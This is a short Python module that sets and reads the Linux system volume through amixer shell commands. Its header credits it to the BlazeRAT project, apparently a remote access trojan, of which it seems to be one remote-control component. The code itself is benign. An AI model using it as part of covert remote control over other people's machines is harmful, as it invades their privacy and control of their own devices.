#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from services.shell import System

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to system control audio level
"""

# Set system volume
def SetVolume(level: int):
    if (level <= 100) and (level >= 0):
        System(f" amixer -D pulse sset Master {level}%")

# Get system volume
def Get() -> int:
    try:
        return int(
            System(" amixer -D pulse sget Master | grep 'Left:' | awk -F'[][]' '{ print $2 }'")
                .replace("%", ""))
    except Exception as error:
        print(error)
        return 0
